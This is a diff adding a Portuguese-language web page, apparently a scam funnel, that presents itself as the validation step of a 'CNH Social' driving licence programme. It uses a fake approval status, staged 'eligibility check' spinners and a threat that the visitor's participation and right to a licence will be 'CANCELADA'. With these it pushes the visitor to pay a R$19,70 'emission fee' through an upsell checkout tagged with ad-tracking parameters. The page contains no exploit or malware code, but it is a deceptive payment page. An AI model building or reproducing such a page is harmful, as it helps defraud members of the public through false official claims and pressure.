@@ -1,0 +1,275 @@
+<!DOCTYPE html><html lang="pt"><head>
+    <script>
+  window.pixelId = "69004dfc4831eecd3cbc3843";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>CNH Social - Validação</title>
+    <link rel="stylesheet" href="css/products.css">
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet" href="css/fonts.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0">
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+
+    
+</head>
+<body>
+
+
+
+
+    <nav class="navbar" style="padding-top: 15px;">
+        <div class="menu-icon" style="padding-left: 3%;">
+            <img src="images/logo-jadlog.png" style="height: 5vh;" alt="Logo CNH Social">
+        </div>
+
+        <div class="logo-central">
+        </div>
+
+        <div class="menu-icon" style="padding-right: 3%;">
+            <span class="material-symbols-outlined" style="font-size: 30px; padding-right: 10px; color: #ffffff">description</span>
+        </div>
+    </nav>
+
+
+
+    <div id="ad1">
+
+        <p style="margin-left: 5%; font-family: 'GellixMedium'; font-size: 22px;">Sua inscrição CNH Social</p>
+
+        <div class="ad1">
+
+            <div style="margin-left: 3%; margin-right: 3%;">
+
+                <button class="styled-button">
+                    <div class="icon-container">
+                        <span class="material-symbols-outlined">badge</span>
+                    </div>
+                    <span class="button-text">
+                        <span class="button-title">#CNH6481749338</span>
+                    </span>
+                </button>
+    
+                <div class="entrega-container">
+                    <div class="entrega-header">
+                        Status
+                    </div>
+                    <div class="entrega-content">
+                        <div class="icon-container2">
+                            <span class="material-symbols-outlined">check</span>
+                        </div>
+                        <div class="text-container">
+                            <div class="entrega-title">Inscrição aprovada</div>
+                        </div>
+                    </div>
+                    <div class="entrega-content">
+                        <div class="icon-container3">
+                            <span class="material-symbols-outlined">warning</span>
+                        </div>
+                        <div class="text-container">
+                            <div class="entrega-title">Taxa de emissão pendente</div>
+                        </div>
+                    </div>
+                </div>
+    
+         
+    
+                <p style="text-align: center; margin-left: 3%; margin-right: 3%;">Sua inscrição no programa CNH Social foi aprovada com sucesso, porém foi identificada uma taxa pendente para emissão. Clique abaixo para resolver essa pendência!</p>
+    
+                <div class="button-container" style="padding-bottom: 20px;">
+                    <button class="styled-button2" onclick="showAd2()">
+                        <span class="button-text">
+                            <span class="button-title2">Resolver pendência</span>
+                        </span>
+                        <span class="material-symbols-outlined" style="font-size: 32px; color: white;">arrow_forward_ios</span>
+                    </button>
+                </div>
+            </div>
+            
+        </div>
+
+        
+        
+    </div>
+
+
+    <div id="ad2" style="display: none;">
+
+        <p style="margin-left: 5%; font-family: 'GellixMedium'; font-size: 22px;">Validação CNH Social</p>
+    
+        <div class="ad2" style="padding-top: 15px; padding-bottom: 15px;">
+    
+            <div style="padding-top: 2px;"></div>
+    
+            <div id="loadingGif" class="loading">
+                <div class="spinner"></div>
+            </div>
+    
+            <div class="entrega-container hidden" id="text1">
+                <div class="entrega-content">
+                    <div class="icon-container2">
+                        <span class="material-symbols-outlined">settings</span>
+                    </div>
+                    <div class="text-container">
+                        <div class="entrega-title">Estamos verificando sua elegibilidade para o programa CNH Social!</div>
+                    </div>
+                </div>
+            </div>
+    
+            <div id="loadingGif2" class="loading hidden">
+                <div class="spinner"></div>
+            </div>
+    
+            <div id="text2" class="hidden entrega-container" style="margin-top: 15px;">
+                <div class="entrega-content">
+                    <div class="icon-container2" style="background-color: red;">
+                        <span class="material-symbols-outlined">warning</span>
+                    </div>
+                    <div class="text-container">     <script>
+                        function checkout(event) {
+                          event.preventDefault(); 
+                          // Pega os parâmetros UTM da URL atual
+                          const urlParams = new URLSearchParams(window.location.search);
+                          const utmParams = {};
+                          
+                          // Mantém apenas os parâmetros UTM e outros relevantes
+                          for (const [key, value] of urlParams.entries()) {
+                              if (key.startsWith('utm_') || ['src', 'sck', 'xcod', 'fbclid', 'gclid', 'ttclid'].includes(key)) {
+                                  utmParams[key] = value;
+                              }
+                          }
+                          
+                          // Adiciona os novos parâmetros
+                          utmParams.from_upsell = '2';
+                          utmParams.valor = '1970';
+                          
+                          // Mantém o parâmetro transaction se existir
+                          if (urlParams.has('transaction')) {
+                              utmParams.transaction = urlParams.get('transaction');
+                          }
+                          
+                          // Constrói a nova URL
+                          const newParams = new URLSearchParams(utmParams);
+                          window.location.href = "/cnh/checkoutup/index.html?" + newParams.toString();
+                        }
+                      </script>
+                        <div class="entrega-title">Identificamos que há uma taxa de processamento pendente para finalizar sua CNH Social!</div>
+                    </div>
+                </div>
+            </div>
+    
+            <div id="loadingGif3" class="loading hidden" style="padding-top: 20px;">
+                <div class="spinner"></div>
+            </div>
+    
+            <div id="text3" class="hidden entrega-container" style="background-color: #d40303; margin-top: 15px;">
+                <div class="entrega-content">
+                    <div class="icon-container2" style="background-color: rgb(255, 255, 255);">
+                        <span class="material-symbols-outlined" style="color: #d40303;">priority_high</span>
+                    </div>
+                    <div class="text-container">
+                        <div class="entrega-title" style="color: white">
+                            É necessário realizar o pagamento da <span class="bold">Taxa de Emissão CNH Social</span> para finalizar o processo e liberar sua carteira de habilitação. O valor da  validação é de <span class="bold">R$19,70</span>. caso você não realize este pagamento agora, sua participação ao programa será automaticamente CANCELADA e todo o progresso feito até aqui será perdido e você perderá seu direito a ter a CNH, como previsto em regulamento.
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+
+<script>
+    
+    function openNewWindowWithUTMs(url) {
+    // Extrai os parâmetros UTM da URL atual
+    const currentUrlParams = new URLSearchParams(window.location.search);
+    let utms = '';
+
+    // Constrói a string dos parâmetros UTM
+    for (let [key, value] of currentUrlParams.entries()) {
+        if (key.startsWith('')) {
+            utms += `${key}=${value}&`;
+        }
+    }
+
+    // Remove o último '&'
+    if (utms) {
+        utms = utms.slice(0, -1); // remove the last '&'
+    }
+
+    // Adiciona os parâmetros UTM à URL especificada
+    const fullUrl = url + (utms? '?' + utms : '');
+
+    // Abre a nova janela ou guia com os parâmetros UTM
+    window.open(fullUrl, '_blank');
+}
+    
+</script>
+
+            <div id="finalButton" class="button-container hidden" style="padding-top: 15px;">
+                
+                <button class="styled-button2" onclick="checkout(event)">
+                    
+                    
+                    <span class="button-text">
+                        <span class="button-title2">Pagar Taxa CNH Social</span>
+                    </span>
+                    <span class="material-symbols-outlined" style="font-size: 32px;">arrow_forward_ios</span>
+                </button>
+            </div>
+
+            <div style="padding-bottom: 2px;"></div>
+
+        
+        <script>
+            function checkout(event) {
+              event.preventDefault(); 
+              // Pega os parâmetros UTM da URL atual
+              const urlParams = new URLSearchParams(window.location.search);
+              const utmParams = {};
+              
+              // Mantém apenas os parâmetros UTM e outros relevantes
+              for (const [key, value] of urlParams.entries()) {
+                  if (key.startsWith('utm_') || ['src', 'sck', 'xcod', 'fbclid', 'gclid', 'ttclid'].includes(key)) {
+                      utmParams[key] = value;
+                  }
+              }
+              
+              // Adiciona os novos parâmetros
+              utmParams.from_upsell = '2';
+              utmParams.valor = '1970';
+              
+              // Mantém o parâmetro transaction se existir
+              if (urlParams.has('transaction')) {
+                  utmParams.transaction = urlParams.get('transaction');
+              }
+              
+              // Constrói a nova URL
+              const newParams = new URLSearchParams(utmParams);
+              window.location.href = "/cnh/checkoutup2/index.html?" + newParams.toString();
+            }
+          </script>
+
+        
+
+    
+    
+    
+    <script src="js/scripts.js"></script>
+
+<script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+
+
+</body></html>
